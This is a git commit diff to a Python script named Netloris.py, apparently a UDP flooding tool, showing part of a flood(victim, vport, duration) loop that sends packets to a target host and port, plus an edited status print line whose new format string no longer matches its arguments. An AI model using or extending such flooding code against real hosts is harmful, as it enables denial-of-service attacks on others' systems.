f2523532aa8c01ea0efb68708cc7a9fa8b3e3728
mrxD1MOD <99124744+mrxD1MOD@users.noreply.github.com>
2022-02-14 14:13:37 +0300

    Update Netloris.py

--- Netloris.py
+++ Netloris.py
@@ -29,7 +29,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "D1MOD1877 %s SEND %s ATTACKS %s "%()
+        print "D1MOD1877  SEND  ATTACKS  "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
